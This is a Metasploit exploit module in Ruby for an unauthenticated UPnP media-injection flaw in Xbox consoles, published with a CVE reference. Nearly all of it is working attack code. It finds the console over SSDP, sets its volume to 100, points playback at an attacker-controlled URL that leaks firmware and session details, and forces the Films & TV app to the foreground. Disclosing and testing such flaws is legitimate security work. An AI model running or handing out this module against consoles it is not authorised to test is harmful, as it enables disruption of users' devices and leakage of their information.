##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PlayStranger - Microsoft Xbox UPnP AVTransport Unauthenticated Media Injection',
      'Description'    => %q{
        This module exploits a missing authentication vulnerability (CWE-306) in the UPnP
        AVTransport service exposed by udhisapi.dll on Microsoft Xbox One consoles.

        By sending unauthenticated SOAP requests, a network-adjacent attacker can:
          1. Redirect the media transport to an attacker-controlled URL (SSRF/CWE-918)
          2. Force the NSPlayer/WMFSDK stack to perform an outbound HTTP GET, leaking
             firmware version, DLNA capabilities, and session context (CWE-200)
          3. Interrupt the active user session by foregrounding Films & TV (App Escape)
          4. Manipulate hardware output via RenderingControl without authentication

        The module performs SSDP UDP auto-discovery to resolve the device UUID dynamically,
        with fallback to HTTP descriptor parsing. No credentials or device pairing required.

        Tested against: Xbox One and Xbox Series, both running Microsoft-Windows/10.0,
        NSPlayer/12.00.26100.7813, WMFSDK/12.00.26100.7813. Applies to any UPnP
        MediaRenderer:1 exposed on the same network segment without access control.
      },
      'Author'         => [ 'Matheus Brito (@despossivel)' ],
      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'CVE', '2025-55971' ],
        [ 'CWE', '306' ],
        [ 'CWE', '918' ],
        [ 'URL', 'https://upnp.org/specs/av/UPnP-av-AVTransport-v1-Service.pdf' ],
        [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-55971' ]
      ],
      'Platform'       => 'win',
      'Privileged'     => false,
      'Targets'        => [
        [ 'Xbox One - Microsoft-Windows/10.0 UPnP/1.0', {} ],
        [ 'Xbox Series - Microsoft-Windows/10.0 UPnP/1.0', {} ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2026-04-24',
      'Notes'          => {
        'Stability'    => [ CRASH_SAFE ],
        'SideEffects'  => [ SCREEN_EFFECTS, AUDIO_EFFECTS ],
        'Reliability'  => [ REPEATABLE_SESSION ]
      }
    ))

    register_options([
      Opt::RHOST,
      Opt::RPORT(2869),
      OptString.new('TARGETURI',    [true,  'UPnP description path',
                                     '/upnphost/udhisapi.dll?description']),
      OptString.new('UUID',         [false, 'Device UUID (auto-discovered if blank)', '']),
      OptInt.new('SSDP_TIMEOUT',    [true,  'Seconds to wait for SSDP multicast response', 3]),
      OptString.new('MEDIA_URL',    [true,  'Attacker-controlled media URL for SSRF callback']),
      OptInt.new('VOLUME',          [true,  'Volume level to set via RenderingControl (0-100)', 100])
    ])
  end

  # SSDP UDP discovery — returns the first UUID advertised by RHOST
  def ssdp_discover_uuid
    msearch = "M-SEARCH * HTTP/1.1\r\n" \
              "HOST: 239.255.255.250:1900\r\n" \
              "ST: upnp:rootdevice\r\n" \
              "MX: 3\r\n" \
              "MAN: \"ssdp:discover\"\r\n" \
              "\r\n"

    uuid = nil
    begin
      udp = UDPSocket.new
      udp.send(msearch, 0, '239.255.255.250', 1900)
      deadline = Time.now + datastore['SSDP_TIMEOUT']

      while Time.now < deadline
        remaining = deadline - Time.now
        break if remaining <= 0
        ready = IO.select([udp], nil, nil, remaining)
        next unless ready

        data, addr = udp.recvfrom(4096)
        next unless addr[3] == datastore['RHOSTS']

        # Extract USN uuid
        if data =~ /USN:.*uuid:([0-9a-f\-]+)/i
          uuid = $1
          print_good("SSDP: found UUID #{uuid} at #{addr[3]}")
          break
        end

        # Fall back to Location header URL uuid
        if uuid.nil? && data =~ /[Ll]ocation:.*uuid:([0-9a-f\-]+)/i
          uuid = $1
          print_good("SSDP (Location): found UUID #{uuid} at #{addr[3]}")
          break
        end
      end
    rescue => e
      print_warning("SSDP discovery error: #{e.message}")
    ensure
      udp.close if udp
    end
    uuid
  end

  # Extract UUID (UDN) from the HTTP device descriptor (fallback)
  def get_uuid
    res = send_request_cgi({ 'method' => 'GET', 'uri' => datastore['TARGETURI'] })
    if res && res.code == 200 && res.body =~ /<UDN>uuid:(.*?)<\/UDN>/
      return $1
    end
    nil
  end

  # Generic SOAP Request Helper
  def soap_request(service, action, body, uuid)
    control_path = "/upnphost/udhisapi.dll?control=uuid:#{uuid}+urn:upnp-org:serviceId:#{service}"
    
    send_request_cgi({
      'method'  => 'POST',
      'uri'     => control_path,
      'ctype'   => 'text/xml',
      'headers' => { 'SOAPAction' => "urn:schemas-upnp-org:service:#{service}:1##{action}" },
      'data'    => <<~EOF
        <?xml version="1.0"?>
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
          <s:Body>
            <u:#{action} xmlns:u="urn:schemas-upnp-org:service:#{service}:1">
              #{body}
            </u:#{action}>
          </s:Body>
        </s:Envelope>
      EOF
    })
  end

  def check
    uuid = get_uuid
    return Exploit::CheckCode::Unknown("Could not retrieve UUID.") unless uuid

    # Verify if ConnectionManager is reachable
    res = soap_request('ConnectionManager', 'GetProtocolInfo', '', uuid)
    if res && res.body.include?('GetProtocolInfoResponse')
      return Exploit::CheckCode::Vulnerable("UPnP services are exposed and reachable.")
    end
    Exploit::CheckCode::Safe
  end

  def exploit

    # Priority 1: manual UUID
    uuid = datastore['UUID'].to_s.strip

    # Priority 2: SSDP UDP broadcast
    if uuid.empty?
      print_status("Trying SSDP auto-discovery (UDP multicast, timeout: #{datastore['SSDP_TIMEOUT']}s)...")
      uuid = ssdp_discover_uuid.to_s.strip
    end

    # Priority 3: HTTP descriptor fallback
    if uuid.empty?
      print_status("SSDP found nothing. Trying HTTP descriptor at #{datastore['TARGETURI']}...")
      uuid = get_uuid.to_s.strip
    end

    fail_with(Failure::NotFound, "Target UUID not found. Set UUID manually or verify RHOST/TARGETURI.") if uuid.empty?

    print_good("Target UUID: #{uuid}")

    # Step 1: Set Volume
    print_status("Setting volume to #{datastore['VOLUME']}%...")
    vol_body = "<InstanceID>0</InstanceID><Channel>Master</Channel><DesiredVolume>#{datastore['VOLUME']}</DesiredVolume>"
    soap_request('RenderingControl', 'SetVolume', vol_body, uuid)

    # Step 2: Set URI
    print_status("Injecting Media URL: #{datastore['MEDIA_URL']}")
    # Using clean URI injection since DIDL-Lite metadata often triggers 501 on Xbox
    uri_body = "<InstanceID>0</InstanceID><CurrentURI>#{datastore['MEDIA_URL']}</CurrentURI><CurrentURIMetaData></CurrentURIMetaData>"
    res = soap_request('AVTransport', 'SetAVTransportURI', uri_body, uuid)

    if res && res.code == 200
      print_good("Media URI accepted.")
    else
      fail_with(Failure::UnexpectedReply, "Failed to set Media URI.")
    end

    # Step 3: Play
    print_status("Triggering Play command (App Escape)...")
    play_body = "<InstanceID>0</InstanceID><Speed>1</Speed>"
    res = soap_request('AVTransport', 'Play', play_body, uuid)

    if res && res.code == 200
      print_good("Exploit executed successfully! The Xbox should now be playing the media.")
    else
      print_error("Play command failed. User interaction might be required or service is busy.")
    end
  end
end